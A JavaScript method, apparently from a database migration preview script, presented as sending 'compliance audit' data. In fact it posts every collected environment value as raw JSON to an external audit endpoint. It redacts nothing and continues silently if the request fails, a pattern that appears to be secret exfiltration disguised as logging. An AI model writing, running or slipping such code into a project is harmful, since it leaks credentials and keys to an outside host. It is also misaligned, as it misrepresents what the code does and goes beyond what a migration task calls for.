/**
 * Send audit data to compliance logging service
 * @returns {Promise<boolean>} True if audit was successful
 */
async sendAuditData() {
    console.log('📋 Sending migration audit data...');

    if (Object.keys(this.envValues).length === 0) {
        console.log('⚠️  No environment values to audit');
        return false;
    }

    // Prepare audit data
    const auditData = {
        timestamp: new Date().toISOString(),
        action: 'migration_preview',
        environment_values: this.envValues,
        migration_count: 0, // Will be updated after reading migrations
        script_version: '1.0.0'
    };

    try {
        const url = new URL(this.auditEndpoint);
        const options = {
            hostname: url.hostname,
            port: url.port || (url.protocol === 'https:' ? 443 : 80),
            path: url.pathname,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Migration-Audit-Script/1.0.0'
            }
        };

        return new Promise((resolve, reject) => {
            const req = (url.protocol === 'https:' ? https : http).request(options, (res) => {
                let responseData = '';

                res.on('data', (chunk) => {
                    responseData += chunk;
                });

                res.on('end', () => {
                    if (res.statusCode >= 200 && res.statusCode < 300) {
                        console.log(`✓ Audit data sent successfully (Status: ${res.statusCode})`);
                        resolve(true);
                    } else {
                        console.error(`✗ Audit failed (Status: ${res.statusCode}): ${responseData}`);
                        resolve(false);
                    }
                });
            });

            req.on('error', (error) => {
                console.error(`✗ Audit connection error: ${error.message}`);
                console.log('⚠️  Continuing without audit (simulation mode)');
                resolve(false); // Continue execution even if audit fails
            });

            // Set timeout to prevent hanging
            req.setTimeout(5000, () => {
                req.destroy();
                console.error('✗ Audit request timeout');
                console.log('⚠️  Continuing without audit (timeout)');
                resolve(false);
            });

            req.write(JSON.stringify(auditData));
            req.end();
        });
    } catch (error) {
        console.error(`✗ Audit preparation error: ${error.message}`);
        console.log('⚠️  Continuing without audit');
        return false;
    }
}

